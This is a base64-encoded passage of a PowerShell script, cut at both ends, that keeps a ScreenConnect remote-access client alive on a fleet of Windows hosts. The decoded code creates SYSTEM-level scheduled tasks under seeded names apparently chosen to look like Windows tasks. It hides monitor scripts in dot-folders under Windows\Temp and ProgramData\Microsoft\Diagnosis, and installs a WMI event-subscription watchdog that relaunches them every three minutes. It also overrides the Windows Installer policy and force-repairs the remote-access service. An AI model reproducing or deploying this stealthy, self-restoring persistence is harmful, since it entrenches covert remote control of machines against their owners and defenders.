ICAjIG93bmVkIG9sZC1uYW1lIHRhc2tzIGFyZSBkZWxldGVkOyBXaW5kb3dzIGJ1aWx0LWlucyB3
aXRoIHNhbWUgbmFtZSBhcmUgbGVmdCBhbG9uZS4KICAgIGlmIChUZXN0LVBhdGggJGNmZ1BhdGgp
IHsKICAgICAgICAkb2xkID0gUmVhZC1JZGVudGl0eQogICAgICAgICMgTDc6IGFsc28gcmVnZW5l
cmF0ZSBpZiBhbnkgVEFTS18qIGlzIGVtcHR5IChMNC1MNiBtb2R1bG8vY2FzdCBidWdzIGxlZnQg
Ymxhbmsgc2xvdHMpCiAgICAgICAgJHNsb3RzT2sgPSAoJG9sZFsnSURFTlRWRVInXSAtZXEgIiRJ
ZGVudFZlcnNpb24iKSAtYW5kICRvbGRbJ1RBU0tfQSddIC1hbmQgJG9sZFsnVEFTS19CJ10gLWFu
ZCAkb2xkWydUQVNLX0MnXSAtYW5kICRvbGRbJ1RBU0tfRCddCiAgICAgICAgaWYgKCRzbG90c09r
KSB7IHJldHVybiAkb2xkIH0KICAgICAgICBmb3JlYWNoICgkayBpbiAnVEFTS19BJywnVEFTS19C
JywnVEFTS19DJywnVEFTS19EJykgewogICAgICAgICAgICAkdG4gPSBbc3RyaW5nXSRvbGRbJGtd
CiAgICAgICAgICAgIGlmICgtbm90ICR0bikgeyBjb250aW51ZSB9CiAgICAgICAgICAgICMgTmV2
ZXIgZGVsZXRlIGEgcmVhbCBXaW5kb3dzIHRhc2sgd2UgbmV2ZXIgb3duZWQgKFRSIGlzIENPTS9j
dXN0b20gaGFuZGxlcikuCiAgICAgICAgICAgIGlmIChUZXN0LVRhc2tPd25zTW9uICR0biAnJykg
eyBSZW1vdmUtVGFza1F1aWV0ICR0biB9CiAgICAgICAgfQogICAgICAgIFJlbW92ZS1JdGVtIC1M
aXRlcmFsUGF0aCAkY2ZnUGF0aCAtRm9yY2UKICAgIH0KICAgICRzID0gR2V0LUhvc3RTZWVkCiAg
ICAjIEw0OiB0d28gc2xvdHMgbWF5IGhhc2ggdG8gdGhlIHNhbWUgdGFzayBwYXRoIChwb29scyBz
aGFyZSBuYW1lcykgLT4KICAgICMgb25lIHBoeXNpY2FsIHRhc2sgdGhlbiBzYXRpc2ZpZXMgdHdv
IHNsb3RzIGFuZCB0aGUgZmxlZXQgc2hvd3MgMy80LgogICAgIyBXYWxrIGVhY2ggcG9vbCBmb3J3
YXJkIHVudGlsIHRoZSBwaWNrIGlzIHVuaXF1ZSBhY3Jvc3Mgc2xvdHMuCiAgICAjIEw2OiB0aGUg
b2xkIEAoQCgnQScsICRzICUgOCksIC4uLikgZm9ybSB3YXMgZG91YmxlLWJyb2tlbiBpbiBQUyA1
LjE6CiAgICAjIGJhcmUgJSBpbnNpZGUgQCgpIHBhcnNlcyBhcyB0aGUgRm9yRWFjaC1PYmplY3Qg
YWxpYXMgKG5vdCBtb2R1bG8pLCBzbyB0aGUKICAgICMgY29sbGVjdGlvbiBjb2xsYXBzZWQgYW5k
IHRoZSBsb29wIG5ldmVyIHJhbiAtPiBpZGVudGl0eS5jZmcgaGFkIEVNUFRZCiAgICAjIFRBU0tf
KiBhbmQgdGhlIHdob2xlIGZsZWV0IGZlbGwgYmFjayB0byBpZGVudGljYWwgZGVmYXVsdCB0YXNr
IG5hbWVzLgogICAgJHNlZWRzID0gW29yZGVyZWRdQHsKICAgICAgICBBID0gKCRzICUgOCkKICAg
ICAgICBCID0gKCgkcyArIDMpICUgOCkKICAgICAgICBDID0gKCgkcyArIDUpICUgOCkKICAgICAg
ICBEID0gKCgkcyArIDcpICUgOCkKICAgIH0KICAgICRwaWNrID0gW29yZGVyZWRdQHt9CiAgICBm
b3JlYWNoICgkbGV0dGVyIGluICdBJywnQicsJ0MnLCdEJykgewogICAgICAgICRpID0gW2ludF0k
c2VlZHNbJGxldHRlcl0KICAgICAgICAkbmFtZSA9ICRQb29sc1skbGV0dGVyXVskaV0KICAgICAg
ICAkbiA9IDAKICAgICAgICB3aGlsZSAoJHBpY2suVmFsdWVzIC1jb250YWlucyAkbmFtZSAtYW5k
ICRuIC1sdCA4KSB7ICRpID0gKCRpICsgMSkgJSA4OyAkbmFtZSA9ICRQb29sc1skbGV0dGVyXVsk
aV07ICRuKysgfQogICAgICAgIGlmICgtbm90ICRuYW1lKSB7ICRuYW1lID0gJERlZmF1bHRzWyJU
QVNLXyRsZXR0ZXIiXSB9CiAgICAgICAgJHBpY2tbJGxldHRlcl0gPSAkbmFtZQogICAgfQogICAg
JGNmZyA9IEAoCiAgICAgICAgIlRBU0tfQT0kKCRwaWNrLkEpIgogICAgICAgICJUQVNLX0I9JCgk
cGljay5CKSIKICAgICAgICAiVEFTS19DPSQoJHBpY2suQykiCiAgICAgICAgIlRBU0tfRD0kKCRw
aWNrLkQpIgogICAgICAgICJNT19BPSQoMiArICgkcyAlIDQpKSIgICAgICAgICAgIyAyLTUgbWlu
IGppdHRlcgogICAgICAgICJNT19CPSQoMyArICgoJHMgKyAxKSAlIDMpKSIgICAgIyAzLTUgbWlu
IGppdHRlcgogICAgICAgICJTRUVEPSRzIgogICAgICAgICJJREVOVFZFUj0kSWRlbnRWZXJzaW9u
IgogICAgKQogICAgU2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRjZmdQYXRoIC1WYWx1ZSAkY2Zn
IC1Gb3JjZQogICAgcmV0dXJuIChSZWFkLUlkZW50aXR5KQp9CgpmdW5jdGlvbiBOb3JtYWxpemUt
VGFza05hbWUoW3N0cmluZ10kdG4pIHsKICAgIGlmICgtbm90ICR0bikgeyByZXR1cm4gJycgfQog
ICAgcmV0dXJuICR0bi5UcmltKCkuVHJpbVN0YXJ0KCdcJykKfQoKZnVuY3Rpb24gV3JpdGUtT3du
TG9nKFtzdHJpbmddJG0pIHsKICAgICRsb2cgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2Jvb3QuZXJy
JwogICAgdHJ5IHsgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICRtIC1Gb3Jj
ZSB9IGNhdGNoIHt9Cn0KCmZ1bmN0aW9uIEVuc3VyZS1QZXJzaXN0VGFza3MgewogICAgIyBNaXJy
b3Igd29ya2luZyBkZXRhY2ggKFd1Y2FjaGVPd24pOiBjbWQgc2NodGFza3MsIEJPT1QgVFIgcGF0
aCwgL1NUIG9uIE1JTlVURS4KICAgICRpZCA9IEluaXRpYWxpemUtSWRlbnRpdHkKICAgIGlmICgt
bm90ICRNb25QYXRoKSB7ICRNb25QYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNt
ZCcgfQogICAgJGJvb3QgPSBKb2luLVBhdGggJGVudjpTeXN0ZW1Sb290ICdUZW1wXC53dWNhY2hl
JwogICAgJGV0bERpciA9ICdDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcRGlhZ25vc2lzXFN0YXRl
XC5ldGxjYWNoZScKICAgIGZvcmVhY2ggKCRkIGluIEAoJGJvb3QsICRldGxEaXIpKSB7CiAgICAg
ICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpKSB7IE5ldy1JdGVtIC1JdGVt
VHlwZSBEaXJlY3RvcnkgLVBhdGggJGQgLUZvcmNlIHwgT3V0LU51bGwgfQogICAgfQogICAgJGJv
b3RNb24gPSBKb2luLVBhdGggJGJvb3QgJ293bl9tb24uY21kJwogICAgJGJvb3RFdGwgPSBKb2lu
LVBhdGggJGJvb3QgJ2V0bF9tb24uY21kJwogICAgJGV0bE1vbiA9IEpvaW4tUGF0aCAkZXRsRGly
ICdldGxfbW9uLmNtZCcKICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRNb25QYXRoKSB7
CiAgICAgICAgQ29weS1JdGVtIC1MaXRlcmFsUGF0aCAkTW9uUGF0aCAtRGVzdGluYXRpb24gJGJv
b3RNb24gLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgQ29weS1J
dGVtIC1MaXRlcmFsUGF0aCAkTW9uUGF0aCAtRGVzdGluYXRpb24gJGJvb3RFdGwgLUZvcmNlIC1F
cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgQ29weS1JdGVtIC1MaXRlcmFsUGF0
aCAkTW9uUGF0aCAtRGVzdGluYXRpb24gJGV0bE1vbiAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVu
dGx5Q29udGludWUKICAgIH0KICAgICMgQk9PVCBpcyBub3QgTG9ja0RpcidkIGJ5IG93bl9zZWN1
cmUg4oCUIFRhc2sgU2NoZWR1bGVyIGNhbiByZXNvbHZlIFRSIHRoZXJlLgogICAgJHRyTW9uID0g
ImNtZC5leGUgL2MgJGJvb3RNb24iCiAgICAkdHJFdGwgPSAiY21kLmV4ZSAvYyAkYm9vdEV0bCIK
ICAgICRtb0EgPSBbc3RyaW5nXSRpZFsnTU9fQSddOyBpZiAoLW5vdCAkbW9BKSB7ICRtb0EgPSAn
MicgfQogICAgJG1vQiA9IFtzdHJpbmddJGlkWydNT19CJ107IGlmICgtbm90ICRtb0IpIHsgJG1v
QiA9ICczJyB9CiAgICAkc3QgPSAoR2V0LURhdGUpLlRvU3RyaW5nKCdISDptbScpCiAgICAkc3Bl
Y3MgPSBAKAogICAgICAgIEB7IEtleSA9ICdUQVNLX0EnOyBNYXJrZXIgPSAnb3duX21vbi5jbWQn
OyBTYyA9ICdNSU5VVEUnOyBNbyA9ICRtb0E7IFRyID0gJHRyTW9uIH0KICAgICAgICBAeyBLZXkg
PSAnVEFTS19CJzsgTWFya2VyID0gJ2V0bF9tb24uY21kJzsgU2MgPSAnTUlOVVRFJzsgTW8gPSAk
bW9COyBUciA9ICR0ckV0bCB9CiAgICAgICAgQHsgS2V5ID0gJ1RBU0tfQyc7IE1hcmtlciA9ICdv
d25fbW9uLmNtZCc7IFNjID0gJ09OU1RBUlQnOyBNbyA9ICcnOyBUciA9ICR0ck1vbiB9CiAgICAg
ICAgQHsgS2V5ID0gJ1RBU0tfRCc7IE1hcmtlciA9ICdvd25fbW9uLmNtZCc7IFNjID0gJ09OTE9H
T04nOyBNbyA9ICcnOyBUciA9ICR0ck1vbiB9CiAgICApCiAgICAkb2sgPSAwOyAkcmVhcm1lZCA9
IDA7ICRmYWlsID0gMAogICAgZm9yZWFjaCAoJHNwIGluICRzcGVjcykgewogICAgICAgICR0biA9
IE5vcm1hbGl6ZS1UYXNrTmFtZSAoW3N0cmluZ10kaWRbJHNwLktleV0pCiAgICAgICAgaWYgKC1u
b3QgJHRuKSB7ICRmYWlsKys7IGNvbnRpbnVlIH0KICAgICAgICBpZiAoVGVzdC1UYXNrT3duc01v
biAkdG4gJHNwLk1hcmtlcikgeyAkb2srKzsgY29udGludWUgfQogICAgICAgIGlmIChUZXN0LVRh
c2tPd25zTW9uICgiXCR0biIpICRzcC5NYXJrZXIpIHsgJG9rKys7IGNvbnRpbnVlIH0KICAgICAg
ICAkYmxvYiA9IEdldC1UYXNrVmVyYm9zZUJsb2IgJHRuCiAgICAgICAgaWYgKC1ub3QgJGJsb2Ip
IHsgJGJsb2IgPSBHZXQtVGFza1ZlcmJvc2VCbG9iICgiXCR0biIpIH0KICAgICAgICBpZiAoJGJs
b2IpIHsKICAgICAgICAgICAgJG91cnNCcm9rZW4gPSAoJGJsb2IgLW1hdGNoICcoP2kpb3duX21v
blwuY21kfGV0bF9tb25cLmNtZHxcLnd1Y2FjaGVcXHxcLmV0bGNhY2hlXFwnKQogICAgICAgICAg
ICBpZiAoLW5vdCAkb3Vyc0Jyb2tlbikgeyAkZmFpbCsrOyBXcml0ZS1Pd25Mb2cgInRhc2tzX3Nr
aXBfZm9yZWlnbiAkdG4iOyBjb250aW51ZSB9CiAgICAgICAgICAgIFJlbW92ZS1UYXNrUXVpZXQg
JHRuCiAgICAgICAgICAgIFJlbW92ZS1UYXNrUXVpZXQgKCJcJHRuIikKICAgICAgICB9CiAgICAg
ICAgIyBCdWlsZCBjbWRsaW5lIGV4YWN0bHkgbGlrZSBvd24uY21kIGRldGFjaCAocHJvdmVuIHRv
IHdvcmsgYXMgU1lTVEVNKS4KICAgICAgICAkcGFydHMgPSBAKAogICAgICAgICAgICAnL0NyZWF0
ZScsICcvVE4nLCAkdG4sICcvUlUnLCAnU1lTVEVNJywgJy9STCcsICdISUdIRVNUJywgJy9GJywK
ICAgICAgICAgICAgJy9UUicsICRzcC5UciwgJy9TQycsICRzcC5TYwogICAgICAgICkKICAgICAg
ICBpZiAoJHNwLlNjIC1lcSAnTUlOVVRFJykgewogICAgICAgICAgICAkcGFydHMgKz0gQCgnL01P
JywgJHNwLk1vLCAnL1NUJywgJHN0KQogICAgICAgIH0KICAgICAgICAkYXJnTGluZSA9ICgkcGFy
dHMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgIGlmICgkXyAtbWF0Y2ggJ1tccyJdJykg
eyAnInswfSInIC1mICgkXyAtcmVwbGFjZSAnIicsICdcIicpIH0gZWxzZSB7ICRfIH0KICAgICAg
ICB9KSAtam9pbiAnICcKICAgICAgICAkY3JlYXRlVHh0ID0gY21kLmV4ZSAvYyAic2NodGFza3Mu
ZXhlICRhcmdMaW5lIiAyPiYxIHwgRm9yRWFjaC1PYmplY3QgeyAiJF8iIH0KICAgICAgICAkY3Jl
YXRlSm9pbmVkID0gKCRjcmVhdGVUeHQgLWpvaW4gJyAnKS5UcmltKCkKICAgICAgICBXcml0ZS1P
d25Mb2cgInRhc2tzX2NyZWF0ZSAkKCRzcC5LZXkpICR0biA9PiAkY3JlYXRlSm9pbmVkIgogICAg
ICAgIGlmICgoVGVzdC1UYXNrT3duc01vbiAkdG4gJHNwLk1hcmtlcikgLW9yIChUZXN0LVRhc2tP
d25zTW9uICgiXCR0biIpICRzcC5NYXJrZXIpKSB7CiAgICAgICAgICAgICRyZWFybWVkKysKICAg
ICAgICAgICAgaWYgKCRzcC5LZXkgLWVxICdUQVNLX0EnIC1vciAkc3AuS2V5IC1lcSAnVEFTS19C
JykgewogICAgICAgICAgICAgICAgY21kLmV4ZSAvYyAic2NodGFza3MuZXhlIC9SdW4gL1ROIGAi
JHRuYCIiIHwgT3V0LU51bGwKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAg
ICAgICRmYWlsKysKICAgICAgICAgICAgV3JpdGUtT3duTG9nICJ0YXNrc19jcmVhdGVfRkFJTCAk
KCRzcC5LZXkpICR0biIKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gInRhc2tzIG9rPSRvayBy
ZWFybWVkPSRyZWFybWVkIGZhaWw9JGZhaWwiCn0KCmZ1bmN0aW9uIFJlbW92ZS1XYXRjaGRvZyB7
CiAgICBmb3JlYWNoICgkY2xzIGluIEAoJ19fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcnLCdfX0V2
ZW50RmlsdGVyJywnQ29tbWFuZExpbmVFdmVudENvbnN1bWVyJywnX19JbnRlcnZhbFRpbWVySW5z
dHJ1Y3Rpb24nKSkgewogICAgICAgIEdldC1XbWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNj
cmlwdGlvbiAtQ2xhc3MgJGNscyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8CiAgICAg
ICAgICAgIFdoZXJlLU9iamVjdCB7CiAgICAgICAgICAgICAgICAoJF8uTmFtZSAtZXEgJ1d1Y2Fj
aGVXYXRjaGRvZ0YnKSAtb3IgKCRfLk5hbWUgLWVxICdXdWNhY2hlV2F0Y2hkb2dDJykgLW9yCiAg
ICAgICAgICAgICAgICAoJF8uVGltZXJJZCAtZXEgJ1d1Y2FjaGVXYXRjaGRvZycpIC1vcgogICAg
ICAgICAgICAgICAgKCRfLkZpbHRlciAtYW5kICRfLkZpbHRlci5Ub1N0cmluZygpIC1saWtlICcq
V3VjYWNoZVdhdGNoZG9nRionKSAtb3IKICAgICAgICAgICAgICAgICgkXy5Db25zdW1lciAtYW5k
ICRfLkNvbnN1bWVyLlRvU3RyaW5nKCkgLWxpa2UgJypXdWNhY2hlV2F0Y2hkb2dDKicpCiAgICAg
ICAgICAgIH0gfCBGb3JFYWNoLU9iamVjdCB7ICRfLkRlbGV0ZSgpIHwgT3V0LU51bGwgfQogICAg
fQp9CgpmdW5jdGlvbiBJbnN0YWxsLVdhdGNoZG9nIHsKICAgIGlmICgtbm90ICRNb25QYXRoKSB7
IHJldHVybiAkZmFsc2UgfQogICAgUmVtb3ZlLVdhdGNoZG9nCiAgICAkb2sgPSAkdHJ1ZQogICAg
dHJ5IHsKICAgICAgICBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlv
biAtQ2xhc3MgX19JbnRlcnZhbFRpbWVySW5zdHJ1Y3Rpb24gYAogICAgICAgICAgICAtQXJndW1l
bnRzIEB7IFRpbWVySWQgPSAnV3VjYWNoZVdhdGNoZG9nJzsgSW50ZXJ2YWxNaWxsaXNlY29uZHMg
PSAxODAwMDA7IFNraXBJZlBhc3NlZCA9ICRmYWxzZSB9IHwgT3V0LU51bGwKICAgICAgICAkZiA9
IFNldC1XbWlJbnN0YW5jZSAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBfX0V2
ZW50RmlsdGVyIGAKICAgICAgICAgICAgLUFyZ3VtZW50cyBAeyBOYW1lID0gJ1d1Y2FjaGVXYXRj
aGRvZ0YnOyBFdmVudE5hbWVzcGFjZSA9ICdyb290XGNpbXYyJzsgUXVlcnlMYW5ndWFnZSA9ICdX
UUwnOwogICAgICAgICAgICAgICAgICAgICAgICAgIFF1ZXJ5ID0gIlNFTEVDVCAqIEZST00gX19U
aW1lckV2ZW50IFdIRVJFIFRpbWVySWQ9J1d1Y2FjaGVXYXRjaGRvZyciIH0KICAgICAgICAkYyA9
IFNldC1XbWlJbnN0YW5jZSAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBDb21t
YW5kTGluZUV2ZW50Q29uc3VtZXIgYAogICAgICAgICAgICAtQXJndW1lbnRzIEB7IE5hbWUgPSAn
V3VjYWNoZVdhdGNoZG9nQyc7IENvbW1hbmRMaW5lVGVtcGxhdGUgPSAiY21kLmV4ZSAvYyBgIiRN
b25QYXRoYCIiOyBSdW5JbnRlcmFjdGl2ZWx5ID0gJGZhbHNlIH0KICAgICAgICBTZXQtV21pSW5z
dGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19GaWx0ZXJUb0NvbnN1
bWVyQmluZGluZyBgCiAgICAgICAgICAgIC1Bcmd1bWVudHMgQHsgRmlsdGVyID0gJGY7IENvbnN1
bWVyID0gJGMgfSB8IE91dC1OdWxsCiAgICB9IGNhdGNoIHsgJG9rID0gJGZhbHNlIH0KICAgIHJl
dHVybiAkb2sKfQoKZnVuY3Rpb24gVGVzdC1XYXRjaGRvZ0dyYXBoIHsKICAgICR0ID0gR2V0LVdt
aU9iamVjdCAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBfX0ludGVydmFsVGlt
ZXJJbnN0cnVjdGlvbiAtRmlsdGVyICJUaW1lcklkPSdXdWNhY2hlV2F0Y2hkb2cnIiAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgJGYgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ug
cm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIF9fRXZlbnRGaWx0ZXIgLUZpbHRlciAiTmFtZT0nV3Vj
YWNoZVdhdGNoZG9nRiciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAkYyA9IEdl
dC1XbWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgQ29tbWFuZExp
bmVFdmVudENvbnN1bWVyIC1GaWx0ZXIgIk5hbWU9J1d1Y2FjaGVXYXRjaGRvZ0MnIiAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgJGIgPSAkbnVsbAogICAgaWYgKCRmIC1hbmQgJGMp
IHsKICAgICAgICAkYiA9IEdldC1XbWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlv
biAtQ2xhc3MgX19GaWx0ZXJUb0NvbnN1bWVyQmluZGluZyAtRXJyb3JBY3Rpb24gU2lsZW50bHlD
b250aW51ZSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkZpbHRlciAtbGlrZSAnKld1
Y2FjaGVXYXRjaGRvZ0YqJyAtYW5kICRfLkNvbnN1bWVyIC1saWtlICcqV3VjYWNoZVdhdGNoZG9n
QyonIH0gfAogICAgICAgICAgICBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxCiAgICB9CiAgICByZXR1
cm4gW2Jvb2xdKCR0IC1hbmQgJGYgLWFuZCAkYyAtYW5kICRiKQp9CgpmdW5jdGlvbiBFbnN1cmUt
V2F0Y2hkb2cgewogICAgaWYgKFRlc3QtV2F0Y2hkb2dHcmFwaCkgeyByZXR1cm4gJ09LJyB9CiAg
ICBpZiAoLW5vdCAkTW9uUGF0aCkgeyByZXR1cm4gJ01JU1NJTkcnIH0KICAgIGlmIChJbnN0YWxs
LVdhdGNoZG9nKSB7IHJldHVybiAnUkVBUk1FRCcgfQogICAgcmV0dXJuICdGQUlMJwp9CgojIENv
cnJlY3QgMzItYml0ICsgNjQtYml0IEFSUCBoaXZlcy4gTDYgYW5kIGVhcmxpZXIgdXNlZCBhIHRy
dW5jYXRlZAojIFdPVzY0MzJOb2RlIHBhdGggKG1pc3NpbmcgTWljcm9zb2Z0XFdpbmRvd3MpIHNv
IEVWRVJZIDMyLWJpdCBTQyBwcm9kdWN0CiMgd2FzIGludmlzaWJsZSB0byByZXBhaXIvZXh0ZXJt
aW5hdGUvcmVnaXN0ZXJlZC4KJHNjcmlwdDpVbmluc3RhbGxSb290cyA9IEAoCiAgICAnSEtMTTpc
U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsJywKICAg
ICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVy
c2lvblxVbmluc3RhbGwnCikKCmZ1bmN0aW9uIFRlc3QtU0NSZWdpc3RlcmVkKFtzdHJpbmddJEZp
bmdlcnByaW50KSB7CiAgICAjIEw4OiBORVZFUiB1c2UgcmV0dXJuIGluc2lkZSBGb3JFYWNoLU9i
amVjdCAtIGl0IG9ubHkgZXhpdHMgdGhlCiAgICAjIHBpcGVsaW5lIGl0ZXJhdGlvbiwgc28gdGhp
cyBmdW5jdGlvbiBhbHdheXMgZmVsbCB0aHJvdWdoIHRvICdubycKICAgICMgYW5kIHRoZSBtb24g
b3JwaGFuLWxhZGRlciBkZWxldGVkIGhlYWx0aHkgcmVnaXN0ZXJlZCBzZXJ2aWNlcy4KICAgIGlm
ICgtbm90ICRGaW5nZXJwcmludCkgeyByZXR1cm4gJ25vJyB9CiAgICAkbmFtZSA9ICJTY3JlZW5D
b25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIKICAgIGZvcmVhY2ggKCRyb290IGluICRzY3Jp
cHQ6VW5pbnN0YWxsUm9vdHMpIHsKICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyb290KSkg
eyBjb250aW51ZSB9CiAgICAgICAgZm9yZWFjaCAoJGtleSBpbiAoR2V0LUNoaWxkSXRlbSAkcm9v
dCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkpIHsKICAgICAgICAgICAgJGRuID0gKEdl
dC1JdGVtUHJvcGVydHkgJGtleS5QU1BhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUp
LkRpc3BsYXlOYW1lCiAgICAgICAgICAgIGlmICgkZG4gLWFuZCAoJGRuIC1pZXEgJG5hbWUpIC1h
bmQgKCRrZXkuUFNDaGlsZE5hbWUgLWxpa2UgJ3sqfScpKSB7IHJldHVybiAneWVzJyB9CiAgICAg
ICAgfQogICAgfQogICAgcmV0dXJuICdubycKfQoKZnVuY3Rpb24gUmVwYWlyLVNDU2VydmljZShb
c3RyaW5nXSRGaW5nZXJwcmludCkgewogICAgIyBSZWNyZWF0ZXMgYSBkZWxldGVkIFNDIHNlcnZp
Y2UgZW50cnkgYnkgcmVwYWlyaW5nIHRoZSBSRUdJU1RFUkVEIHByb2R1Y3QuCiAgICAjIG1zaWV4
ZWMgL2ZhIHtHVUlEfSByZXBhaXJzIGluIHBsYWNlIC0gaXQgZG9lcyBOT1QgcnVuIHRoZSBTQy1m
YW1pbHkKICAgICMgbWFqb3ItdXBncmFkZSByZW1vdmFsLCBzbyBvdGhlciBpbnN0YW5jZXMgYXJl
IHVudG91Y2hlZC4KICAgICMgTDU6IGFsc28gaGFuZGxlcyBwcmVzZW50LWJ1dC1TVE9QUEVEIHNl
cnZpY2VzIChyZXBhaXIgcmVzdG9yZXMgYmluYXJpZXMsCiAgICAjIHRoZW4gc3RhcnQpLiBPbmx5
IGEgUnVubmluZyBzZXJ2aWNlIGlzIGNvbnNpZGVyZWQgaGVhbHRoeS4KICAgIGlmICgtbm90ICRG
aW5nZXJwcmludCkgeyByZXR1cm4gJ25vLWZwJyB9CiAgICAkbmFtZSA9ICJTY3JlZW5Db25uZWN0
IENsaWVudCAoJEZpbmdlcnByaW50KSIKICAgICRzdmMgPSBHZXQtU2VydmljZSAtTmFtZSAkbmFt
ZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgaWYgKCRzdmMgLWFuZCAkc3ZjLlN0
YXR1cyAtZXEgJ1J1bm5pbmcnKSB7IHJldHVybiAnc3ZjLXJ1bm5pbmcnIH0KICAgICRndWlkID0g
JG51bGwKICAgIGZvcmVhY2ggKCRyb290IGluICRzY3JpcHQ6VW5pbnN0YWxsUm9vdHMpIHsKICAg
ICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyb290KSkgeyBjb250aW51ZSB9CiAgICAgICAgZm9y
ZWFjaCAoJGtleSBpbiAoR2V0LUNoaWxkSXRlbSAkcm9vdCAtRXJyb3JBY3Rpb24gU2lsZW50bHlD
b250aW51ZSkpIHsKICAgICAgICAgICAgJGRuID0gKEdldC1JdGVtUHJvcGVydHkgJGtleS5QU1Bh
dGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpLkRpc3BsYXlOYW1lCiAgICAgICAgICAg
IGlmICgkZG4gLWFuZCAoJGRuIC1pZXEgJG5hbWUpIC1hbmQgKCRrZXkuUFNDaGlsZE5hbWUgLWxp
a2UgJ3sqfScpKSB7ICRndWlkID0gJGtleS5QU0NoaWxkTmFtZTsgYnJlYWsgfQogICAgICAgIH0K
ICAgICAgICBpZiAoJGd1aWQpIHsgYnJlYWsgfQogICAgfQogICAgaWYgKC1ub3QgJGd1aWQpIHsg
cmV0dXJuICdub3QtcmVnaXN0ZXJlZCcgfQogICAgJiByZWcuZXhlIGRlbGV0ZSAnSEtMTVxTT0ZU
V0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXInIC92IERpc2FibGVNU0kg
L2YgMj4mMSB8IE91dC1OdWxsCiAgICAmIHJlZy5leGUgYWRkICdIS0xNXFNPRlRXQVJFXFBvbGlj
aWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlcicgL3YgRGlzYWJsZU1TSSAvdCBSRUdfRFdP
UkQgL2QgMCAvZiAyPiYxIHwgT3V0LU51bGwKICAgICRsb2cgPSBKb2luLVBhdGggJFdvcmtEaXIg
Im1zaV9yZXBhaXJfJEZpbmdlcnByaW50LmxvZyIKICAgICRwID0gU3RhcnQtUHJvY2VzcyBtc2ll
eGVjLmV4ZSAtQXJndW1lbnRMaXN0ICIvZmEgJGd1aWQgL3FuIC9ub3Jlc3RhcnQgL0wqdiBgIiRs
b2dgIiIgLVdhaXQgLVBhc3NUaHJ1CiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA4CiAgICAmIHNj
LmV4ZSBjb25maWcgIiRuYW1lIiBzdGFydD0gYXV0byAyPiYxIHwgT3V0LU51bGwKICAgICYgc2Mu
ZXhlIHN0YXJ0ICIkbmFtZSIgMj4mMSB8IE91dC1OdWxsCiAgICBTdGFydC1TbGVlcCAtU2Vjb25k
cyA0CiAgICAkc3ZjID0gR2V0LVNlcnZpY2UgLU5hbWUgJG5hbWUgLUVycm9yQWN0aW9uIFNpbGVu
dGx5Q29udGludWUKICAgIGlmICgkc3ZjIC1hbmQgJHN2Yy5TdGF0dXMgLWVxICdSdW5uaW5nJykg
eyByZXR1cm4gInN2Yy1yZXN0b3JlZCBleGl0PSQoJHAuRXhpdENvZGUpIiB9CiAgICBpZiAoJHN2
YykgeyByZXR1cm4gInN2Yy1zdGlsbC1zdG9wcGVkIGV4aXQ9JCgkcC5FeGl0Q29kZSkiIH0KICAg
IHJldHVybiAic3ZjLXN0aWxsLW1pc3NpbmcgZXhpdD0kKCRwLkV4aXRDb2RlKSIKfQoKZnVuY3Rp
b24gSW52b2tlLUV4dGVybWluYXRlIHsKICAgICMgTDc6IHRydWUgcmVtb3ZhbC4gQ29ycmVjdCBX
T1c2NDMyTm9kZSBoaXZlICsgbXNpZXhlYyArIFVuaW5zdGFsbFN0cmluZwogICAgIyBmYWxsYmFj
